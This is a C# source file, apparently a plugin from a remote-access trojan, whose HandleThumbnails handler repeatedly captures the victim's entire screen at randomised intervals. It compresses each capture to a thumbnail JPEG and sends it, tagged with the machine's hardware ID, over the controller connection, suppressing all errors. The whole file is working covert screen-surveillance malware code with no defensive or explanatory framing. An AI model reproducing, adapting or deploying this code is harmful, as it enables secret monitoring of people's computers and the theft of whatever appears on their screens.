using MessagePackLib.MessagePack;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Plugin.Handler
{
    public class HandleThumbnails
    {
        public HandleThumbnails()
        {
            try
            {
                Packet.ctsThumbnails?.Cancel();
                Packet.ctsThumbnails = new CancellationTokenSource();

                while (Connection.IsConnected && !Packet.ctsThumbnails.IsCancellationRequested)
                {
                    Thread.Sleep(new Random().Next(2500, 7000));
                    Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                    using (Graphics g = Graphics.FromImage(bmp))
                    using (MemoryStream memoryStream = new MemoryStream())
                    {
                        g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
                        Image thumb = bmp.GetThumbnailImage(256, 256, () => false, IntPtr.Zero);
                        thumb.Save(memoryStream, ImageFormat.Jpeg);
                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Packet").AsString = "thumbnails";
                        msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                        msgpack.ForcePathObject("Image").SetAsBytes(memoryStream.ToArray());
                        Connection.Send(msgpack.Encode2Bytes());
                        thumb.Dispose();
                    }
                    bmp.Dispose();
                }
            }
            catch
            {
                return;
            }
            Connection.Disconnected();
        }
    }

}
